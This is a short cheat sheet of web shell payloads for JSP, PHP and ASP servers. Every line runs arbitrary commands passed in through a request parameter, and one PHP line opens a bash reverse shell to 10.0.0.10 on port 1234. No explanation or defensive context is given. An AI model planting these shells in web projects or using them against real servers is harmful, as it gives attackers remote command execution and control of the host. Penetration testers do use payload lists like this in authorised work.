
JSP
```
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```shell
PHP
```
<?php echo passthru($_GET['cmd']); ?>

<?php echo shell_exec($_GET['cmd']); ?>

<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>

<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'");

<?php echo shell_exec($_GET['e'].' 2>&1'); ?>

<?php system($_GET['cmd']);?>
```shell

ASP
```
<% eval request("cmd") %>
```shell
